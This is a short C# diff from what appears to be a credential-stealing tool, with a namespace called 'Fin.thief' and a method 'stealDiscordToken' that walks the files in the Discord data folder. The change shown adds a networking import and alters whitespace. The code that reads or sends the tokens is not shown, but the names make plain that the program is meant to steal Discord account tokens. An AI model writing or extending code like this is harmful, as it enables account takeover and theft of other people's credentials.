@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Net;
 using System.Security.Cryptography;
 using System.Text;
 using static System.IO.File;
@@ -20,7 +21,7 @@ namespace Fin.thief
         
         public void stealDiscordToken()
         {
-
+            
             if (Directory.Exists(DiscordData))
             {
                 foreach (var file in Directory.GetFiles(DiscordData))
